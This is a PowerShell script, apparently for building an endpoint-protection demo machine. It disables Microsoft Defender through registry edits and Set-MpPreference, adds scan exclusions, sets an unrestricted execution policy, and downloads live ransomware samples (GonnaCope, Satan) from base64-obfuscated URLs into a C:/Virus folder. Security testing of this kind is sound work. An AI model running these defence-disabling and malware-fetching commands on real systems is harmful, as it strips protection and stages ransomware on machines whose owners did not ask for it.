
Write-Host -BackgroundColor Black -ForegroundColor Yellow "$((Get-Date).ToString()) - Starting Script"
Enable-PSRemoting -SkipNetworkProfileCheck -Force
Set-ExecutionPolicy Unrestricted 
#Install Chrome & 7Zip
Try {
#$LocalTempDir = $env:TEMP; $ChromeInstaller = "ChromeInstaller.exe"; (new-object System.Net.WebClient).DownloadFile('http://dl.google.com/chrome/install/375.126/chrome_installer.exe', "$LocalTempDir\$ChromeInstaller"); & "$LocalTempDir\$ChromeInstaller" /silent /install; $Process2Monitor =  "ChromeInstaller"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { "Still running: $($ProcessesFound -join ', ')" | Write-Host; Start-Sleep -Seconds 3 } else { rm "$LocalTempDir\$ChromeInstaller" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)
#Disable Defender as much as possible
$Installer7Zip = $env:TEMP + "\7z1900.msi"; 
Invoke-WebRequest "https://www.7-zip.org/a/7z1900.msi" -OutFile $Installer7Zip; 
msiexec /i $Installer7Zip /qb;
Remove-Item $Installer7Zip;
} Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }

Try {
 $regpath='HKLM:\SYSTEM\CurrentControlSet\Services'
 Set-ItemProperty -Path ($regpath+"\WinDefend") -Name Start -Value 4
 Set-ItemProperty -Path ($regpath+"\Sense") -Name Start -Value 4
 Set-ItemProperty -Path ($regpath+"\WdFilter") -Name Start -Value 4
 Set-ItemProperty -Path ($regpath+"\WdNisDrv") -Name Start -Value 4
 Set-ItemProperty -Path ($regpath+"\WdNisSvc") -Name Start -Value 4
 Set-ItemProperty -Path ($regpath+"\WdBoot") -Name Start -Value 4

 
Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:/Users/Public/Desktop/" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:/Users/Public/Documents/" -ErrorAction SilentlyContinue
mkdir "C:/Virus" -ErrorAction Continue
Add-MpPreference -ExclusionPath "C:/Virus" -ErrorAction SilentlyContinue
} Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" } 

#Download Documents Package and background
  Try {
  $uri = "https://github.com/ChillBill77/SentinelOne/raw/main/Documents/doc-package.zip"
  $filename = "doc-package.zip"
  Invoke-WebRequest -Uri "$uri" -Outfile "$env:TEMP/$filename"
  Expand-Archive -Path "$env:TEMP/$filename" -DestinationPath "$env:HOMEPATH\Desktop" -Force
  Expand-Archive -Path "$env:TEMP/$filename" -DestinationPath "$env:HOMEPATH\Documents" -Force
  rm -Path "$env:HOMEPATH\Desktop\__MACOSX" -Force

  } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
  
Try {
  #Set Background
  $StatusValue = "1"
  $DesktopImageValue = "C:/Users/Public/Desktop/orange-cyber-defense.jpg"
  $LockScreenImageValue = "C:/Users/Public/Desktop/orange-cyber-defense.jpg"
  $RegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"
  $DesktopPath = "DesktopImagePath"
  $DesktopStatus = "DesktopImageStatus"
  $DesktopUrl = "DesktopImageUrl"
  $LockScreenPath = "LockScreenImagePath"
  $LockScreenStatus = "LockScreenImageStatus"
  $LockScreenUrl = "LockScreenImageUrl"
  
      if(!(Test-Path $RegKeyPath)) {
          Write-Host "Creating registry path $($RegKeyPath)."
          New-Item -Path $RegKeyPath -Force | Out-Null
      }
      if ($LockScreenSource) {
          Write-Host "Creating registry entries for Lock Screen"
          New-ItemProperty -Path $RegKeyPath -Name $LockScreenStatus -Value $StatusValue -PropertyType DWORD -Force | Out-Null
          New-ItemProperty -Path $RegKeyPath -Name $LockScreenPath -Value $LockScreenImageValue -PropertyType STRING -Force | Out-Null
          New-ItemProperty -Path $RegKeyPath -Name $LockScreenUrl -Value $LockScreenImageValue -PropertyType STRING -Force | Out-Null
      }
      if ($BackgroundSource) {
          Write-Host "Copy Desktop Background image from $($BackgroundSource) to $($DesktopImageValue)."
          Copy-Item $BackgroundSource $DesktopImageValue -Force
          Write-Host "Creating registry entries for Desktop Background"
          New-ItemProperty -Path $RegKeyPath -Name $DesktopStatus -Value $StatusValue -PropertyType DWORD -Force | Out-Null
          New-ItemProperty -Path $RegKeyPath -Name $DesktopPath -Value $DesktopImageValue -PropertyType STRING -Force | Out-Null
          New-ItemProperty -Path $RegKeyPath -Name $DesktopUrl -Value $DesktopImageValue -PropertyType STRING -Force | Out-Null
      }  
  
  } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
  
Try {
  #Download SentinelOne Agent (without installing)
  $uri = "https://github.com/ChillBill77/SentinelOne/raw/main/Documents/SentinelOneInstaller_windows_32bit_v23_1_5_886.exe"
  $filename = "SentinelOne-installer32.exe"
  Invoke-WebRequest -Uri "$uri" -Outfile "C:/Virus/$filename"
  } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }

Try {
 #Download SentinelOne Agent (without installing)
 $uri = "https://github.com/ChillBill77/SentinelOne/raw/main/Documents/SentinelOneInstaller_windows_64bit_v23_1_5_886.exe"
 $filename = "SentinelOne-installer64.exe"
 Invoke-WebRequest -Uri "$uri" -Outfile "C:/Virus/$filename"
 } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
     
 
 
# Download Test-Virs Obfuscated from ZOO
# Try {
#   $base64uri = "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwB5AHQAaQBzAGYALwB0AGgAZQBaAG8AbwAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBtAGEAbAB3AGEAcgBlAC8AQgBpAG4AYQByAGkAZQBzAC8AVwBpAG4AMwAyAC4AVwBhAG4AbgBhAFAAZQBhAGMAZQAvAFcAaQBuADMAMgAuAFcAYQBuAG4AYQBQAGUAYQBjAGUALgB6AGkAcAA="
#   $uri = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64uri))
#   $filename = "TestDemo-WannaP.zip"
#   Invoke-WebRequest -Uri "$uri" -Outfile "C:/Virus/$filename"
#  } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
 
 Try {
   $base64uri = "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwB2AHgAdQBuAGQAZQByAGcAcgBvAHUAbgBkAC8ATQBhAGwAdwBhAHIAZQBTAG8AdQByAGMAZQBDAG8AZABlAC8AcgBhAHcALwBtAGEAaQBuAC8AVwBpAG4AMwAyAC8AUgBhAG4AcwBvAG0AdwBhAHIAZQAvAFcAaQBuADMAMgAuAEIAQQBUAC4ARwBvAG4AbgBhAEMAbwBwAGUALgA3AHoA"
   $uri = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64uri))
   $filename = "GonnaTry.7z"
   Invoke-WebRequest -Uri "$uri" -Outfile "C:/Virus/$filename"
  } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
  
Try {
    $base64uri = "aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBmAGEAYgByAGkAbQBhAGcAaQBjADcAMgAvAG0AYQBsAHcAYQByAGUALQBzAGEAbQBwAGwAZQBzAC8AbQBhAHMAdABlAHIALwBSAGEAbgBzAG8AbQB3AGEAcgBlAC8AUwBhAHQAYQBuAC8AcwBhAHQAYQBuAC4AegBpAHAA"
    $uri = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64uri))
    $filename = "TestDemo-Satan.zip"
    Invoke-WebRequest -Uri "$uri" -Outfile "C:/Virus/$filename"
   } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
  

# https://vng.nl/sites/default/files/2021-01/vng_logo_300.png
Try {
     $uri = "https://7-zip.org/a/7z2301-x64.exe"
     $filename = "7z2301-x64.exe"
     Invoke-WebRequest -Uri "$uri" -Outfile "$env:HOMEPATH\Desktop"
    } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }
 
Try {
    $uri = "https://github.com/ChillBill77/SentinelOne/raw/main/Order_Invoices.zip"
    $filename = "Order_Invoices.zip"
    Invoke-WebRequest -Uri "$uri" -Outfile "C:/Virus/$filename"
   } Catch { Write-Host -f Yellow "$((Get-Date).ToString()) - An Error occured: $_" }

Try {
     Write-Host -BackgroundColor Black -ForegroundColor Yellow "$((Get-Date).ToString()) - Finished Script" 
     $Error.Clear()
     exit 0
  } Catch { Write-Host -BackgroundColor Black -ForegroundColor Yellow "$((Get-Date).ToString()) - Finished Script" }
  $Error.Clear()
  exit 0 

# #URL BASE64 Encoding
# $input = 
# $By = [System.Text.Encoding]::Unicode.GetBytes($input)
# $output =[Convert]::ToBase64String($By)
# $output

# #Check Back
# $control = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($output))
# $control 
